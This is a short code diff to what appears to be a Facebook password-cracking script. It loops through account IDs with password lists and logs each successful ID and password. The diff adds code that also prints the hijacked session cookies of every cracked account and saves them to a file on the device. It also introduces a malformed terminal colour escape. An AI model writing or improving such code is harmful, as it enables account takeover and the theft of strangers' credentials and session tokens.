@@ -233,8 +233,9 @@ def ffb(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print('\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
-                                print(f'\\\33[1;32m[COOKIE] %s'%(kuki))
+                                print(f'\\\38[1;196m[COOKIE] %s'%(kuki))
                                 open('/sdcard/RAHUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open('/sdcard/RB-COOKIES.txt', 'a').write(ids+'|'+kuki+'\n')
                                 oks.append(ids)
                                 break
                         elif 'checkpoint' in Rahul:
@@ -276,7 +277,9 @@ def ffb3(ids,names,passlist):
                                 coki=session.cookies.get_dict()
                                 kuki = (f";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
                                 print(f'\r\r\033[1;32m [RAHUL-OK] %s | %s'%(ids,pas))
+                                print(f'\\\38[1;196m[COOKIE] %s'%(kuki))
                                 open(f'/sdcard/RAHUL-OK.txt', 'a').write(ids+'|'+pas+'\n')
+                                open('/sdcard/RB-COOKIES.txt', 'a').write(ids+'|'+kuki+'\n')
                                 #cek_apk(session,coki)
                                 oks.append(ids)
                                 break
